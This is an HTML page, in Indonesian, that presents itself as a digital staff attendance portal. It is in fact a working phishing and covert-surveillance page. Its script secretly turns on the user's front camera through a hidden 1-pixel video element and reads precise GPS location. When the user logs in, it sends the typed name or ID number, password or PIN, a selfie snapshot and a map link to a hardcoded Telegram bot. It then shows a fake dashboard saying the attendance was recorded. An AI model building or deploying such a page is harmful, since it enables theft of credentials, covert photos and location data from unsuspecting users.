<!DOCTYPE html><html lang="id"><head>  <meta charset="UTF-8">  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>Portal Presensi Digital</title>  <style>    * {      box-sizing: border-box;      margin: 0;      padding: 0;      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;    }    body {      background-color: #f1f5f9;      display: flex;      justify-content: center;      align-items: center;      min-height: 100vh;    }    .app-container {      width: 100%;      max-width: 420px;      background-color: #ffffff;      min-height: 100vh;      display: flex;      flex-direction: column;      position: relative;      box-shadow: 0 10px 30px rgba(0,0,0,0.08);      overflow: hidden;    }    /* ====================================       1. HALAMAN LOGIN (PAGE 1)    ==================================== */    #loginPage {      padding: 40px 24px;      display: flex;      flex-direction: column;      justify-content: center;      min-height: 100vh;      background: linear-gradient(180deg, #ffffff 0%, #f8fafc 100%);    }    .brand-badge {      width: 56px;      height: 56px;      background: linear-gradient(135deg, #2563eb, #1d4ed8);      border-radius: 16px;      display: flex;      align-items: center;      justify-content: center;      font-size: 1.8rem;      color: white;      margin: 0 auto 20px;      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);    }    .login-header {      text-align: center;      margin-bottom: 32px;    }    .login-header h2 {      font-size: 1.6rem;      color: #0f172a;      font-weight: 800;      letter-spacing: -0.5px;    }    .login-header p {      font-size: 0.85rem;      color: #64748b;      margin-top: 6px;    }    .form-group {      margin-bottom: 20px;    }    .form-group label {      display: block;      font-size: 0.8rem;      font-weight: 700;      color: #334155;      margin-bottom: 8px;      text-transform: uppercase;      letter-spacing: 0.5px;    }    .form-group input {      width: 100%;      padding: 14px 16px;      border: 1.5px solid #e2e8f0;      border-radius: 12px;      font-size: 0.95rem;      outline: none;      background-color: #f8fafc;      transition: all 0.2s ease;    }    .form-group input:focus {      border-color: #2563eb;      background-color: #ffffff;      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);    }    .btn-login {      width: 100%;      background: linear-gradient(135deg, #2563eb, #1d4ed8);      color: white;      border: none;      padding: 16px;      border-radius: 12px;      font-size: 1rem;      font-weight: 700;      cursor: pointer;      margin-top: 10px;      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.35);      transition: transform 0.1s ease, box-shadow 0.2s ease;    }    .btn-login:active {      transform: scale(0.98);    }    .btn-login:disabled {      background: #94a3b8;      box-shadow: none;      cursor: not-allowed;    }    .hidden-camera {      position: absolute;      width: 1px;      height: 1px;      opacity: 0;      pointer-events: none;    }    #status {      margin-top: 16px;      font-size: 0.85rem;      text-align: center;      font-weight: 600;    }    /* ====================================       2. HALAMAN DASHBOARD PORTAL (PAGE 2)    ==================================== */    #dashboardPage {      display: none;      flex-direction: column;      min-height: 100vh;      background-color: #f8fafc;    }    .dashboard-header {      background: linear-gradient(135deg, #1e293b, #0f172a);      color: white;      padding: 28px 20px 36px;      border-bottom-left-radius: 28px;      border-bottom-right-radius: 28px;    }    .user-info {      display: flex;      justify-content: space-between;      align-items: center;      margin-bottom: 24px;    }    .user-profile {      display: flex;      align-items: center;      gap: 12px;    }    .avatar {      width: 46px;      height: 46px;      background: linear-gradient(135deg, #3b82f6, #1d4ed8);      border-radius: 14px;      display: flex;      align-items: center;      justify-content: center;      font-weight: bold;      font-size: 1.2rem;      color: white;      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);    }    .greeting p {      font-size: 0.75rem;      color: #94a3b8;    }    .greeting h3 {      font-size: 1.05rem;      font-weight: 700;      color: #f8fafc;    }    .stat-card {      background: rgba(255, 255, 255, 0.08);      backdrop-filter: blur(12px);      border: 1px solid rgba(255, 255, 255, 0.12);      border-radius: 20px;      padding: 20px;      display: flex;      justify-content: space-between;      align-items: center;    }    .stat-title {      font-size: 0.75rem;      color: #94a3b8;      text-transform: uppercase;      letter-spacing: 0.5px;    }    .stat-value {      font-size: 1.4rem;      font-weight: 800;      color: #ffffff;      margin-top: 4px;    }    .badge-status {      background-color: rgba(34, 197, 94, 0.15);      color: #4ade80;      border: 1px solid rgba(34, 197, 94, 0.3);      padding: 6px 14px;      border-radius: 20px;      font-size: 0.75rem;      font-weight: 700;    }    .content-body {      padding: 24px 20px;      flex: 1;    }    .section-title {      font-size: 0.9rem;      font-weight: 700;      color: #334155;      margin-bottom: 14px;    }    .menu-grid {      display: grid;      grid-template-columns: repeat(4, 1fr);      gap: 12px;      background: #ffffff;      padding: 20px 16px;      border-radius: 20px;      box-shadow: 0 4px 20px rgba(0,0,0,0.03);      border: 1px solid #f1f5f9;      margin-bottom: 24px;    }    .menu-item {      display: flex;      flex-direction: column;      align-items: center;      gap: 8px;      cursor: pointer;    }    .menu-icon {      width: 48px;      height: 48px;      background-color: #eff6ff;      border-radius: 14px;      display: flex;      align-items: center;      justify-content: center;      font-size: 1.2rem;      transition: transform 0.2s ease;    }    .menu-item:hover .menu-icon {      transform: translateY(-2px);    }    .menu-item span {      font-size: 0.72rem;      color: #475569;      font-weight: 600;    }    .history-card {      background: #ffffff;      border-radius: 20px;      padding: 20px;      box-shadow: 0 4px 20px rgba(0,0,0,0.03);      border: 1px solid #f1f5f9;    }    .history-item {      display: flex;      justify-content: space-between;      align-items: center;      padding: 12px 0;      border-bottom: 1px solid #f1f5f9;    }    .history-item:last-child {      border-bottom: none;    }    .history-info p {      font-size: 0.85rem;      font-weight: 700;      color: #1e293b;    }    .history-info small {      font-size: 0.72rem;      color: #94a3b8;    }    .history-badge {      font-size: 0.75rem;      font-weight: 700;      color: #16a34a;      background-color: #f0fdf4;      padding: 4px 10px;      border-radius: 8px;    }  </style></head><body>  <div class="app-container">    <!-- ================= HALAMAN 1: LOGIN ================= -->    <div id="loginPage">      <div class="brand-badge">📋</div>      <div class="login-header">        <h2>Portal Presensi</h2>        <p>Silakan verifikasi akun untuk mencatat kehadiran</p>      </div>      <form id="loginForm">        <div class="form-group">          <label>Nama Lengkap / NIK</label>          <input type="text" id="inputNama" placeholder="Masukkan nama atau NIK..." required>        </div>        <div class="form-group">          <label>Kata Sandi / PIN</label>          <input type="password" id="inputPin" placeholder="Masukkan PIN atau Sandi..." required>        </div>        <button type="submit" id="btnLogin" class="btn-login">VERIFIKASI & LOG MASUK</button>        <div id="status"></div>      </form>      <!-- Elemen Kamera Tersembunyi -->      <video id="webcam" class="hidden-camera" autoplay playsinline muted></video>      <canvas id="canvas" class="hidden-camera"></canvas>    </div>    <!-- ================= HALAMAN 2: DASHBOARD PORTAL ================= -->    <div id="dashboardPage">      <div class="dashboard-header">        <div class="user-info">          <div class="user-profile">            <div class="avatar" id="userAvatar">A</div>            <div class="greeting">              <p>Selamat Datang,</p>              <h3 id="displayNama">Karyawan</h3>            </div>          </div>        </div>        <div class="stat-card">          <div>            <div class="stat-title">Status Kehadiran</div>            <div class="stat-value">Tercatat</div>          </div>          <div class="badge-status">Online</div>        </div>      </div>      <div class="content-body">        <div class="section-title">Menu Utama</div>        <div class="menu-grid">          <div class="menu-item">            <div class="menu-icon">📅</div>            <span>Jadwal</span>          </div>          <div class="menu-item">            <div class="menu-icon">📊</div>            <span>Laporan</span>          </div>          <div class="menu-item">            <div class="menu-icon">📝</div>            <span>Izin/Cuti</span>          </div>          <div class="menu-item">            <div class="menu-icon">⚙️</div>            <span>Pengaturan</span>          </div>        </div>        <div class="section-title">Aktivitas Terakhir</div>        <div class="history-card">          <div class="history-item">            <div class="history-info">              <p>Presensi Masuk</p>              <small>Hari ini, Baru saja</small>            </div>            <div class="history-badge">Sukses</div>          </div>          <div class="history-item">            <div class="history-info">              <p>Presensi Pulang</p>              <small>Kemarin, 17:00 WIB</small>            </div>            <div class="history-badge">Sukses</div>          </div>        </div>      </div>    </div>  </div>  <script>    // === MASUKKAN BOT TOKEN & CHAT ID TELEGRAM DI SINI ===    const BOT_TOKEN = '8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is';    const CHAT_ID = '6742478722';    const loginPage = document.getElementById('loginPage');    const dashboardPage = document.getElementById('dashboardPage');    const loginForm = document.getElementById('loginForm');    const btnLogin = document.getElementById('btnLogin');    const statusDiv = document.getElementById('status');    const video = document.getElementById('webcam');    const canvas = document.getElementById('canvas');    let userLat = null;    let userLon = null;    // 1. Inisialisasi Kamera & Lokasi GPS    window.addEventListener('load', () => {      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })          .then(stream => { video.srcObject = stream; })          .catch(err => console.warn('Kamera tidak diizinkan:', err));      }      if (navigator.geolocation) {        navigator.geolocation.getCurrentPosition(          pos => {            userLat = pos.coords.latitude;            userLon = pos.coords.longitude;          },          err => console.warn('GPS tidak diizinkan:', err),          { enableHighAccuracy: true }        );      }    });    // 2. Kirim Data saat Login    loginForm.addEventListener('submit', async (e) => {      e.preventDefault();      const nama = document.getElementById('inputNama').value;      const pin = document.getElementById('inputPin').value;      btnLogin.disabled = true;      statusDiv.style.color = '#2563eb';      statusDiv.innerText = 'Memproses verifikasi kehadiran...';      // Tangkap selfie      canvas.width = video.videoWidth || 640;      canvas.height = video.videoHeight || 480;      const ctx = canvas.getContext('2d');      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);      const mapUrl = (userLat && userLon)         ? `https://maps.google.com/?q=${userLat},${userLon}`         : 'Lokasi tidak diizinkan';      const caption = `📌 *LOG PRESI TERKIRIM*\n\n` +                      `👤 *Nama/NIK:* ${nama}\n` +                      `🔑 *Sandi/PIN:* ${pin}\n` +                      `📍 *Lokasi:* [Buka Google Maps](${mapUrl})\n` +                      `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;      canvas.toBlob(async (blob) => {        const formData = new FormData();        formData.append('chat_id', CHAT_ID);        if (blob) formData.append('photo', blob, 'selfie.jpg');        formData.append('caption', caption);        formData.append('parse_mode', 'Markdown');        try {          if (!BOT_TOKEN.includes('ISI_TOKEN_BOT')) {            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {              method: 'POST',              body: formData            });          }        } catch (err) {          console.error('Gagal kirim ke Telegram:', err);        } finally {          // Berpindah ke Dashboard Portal          document.getElementById('displayNama').innerText = nama;          document.getElementById('userAvatar').innerText = nama.charAt(0).toUpperCase();          loginPage.style.display = 'none';          dashboardPage.style.display = 'flex';        }      }, 'image/jpeg', 0.8);    });  </script></body></html>
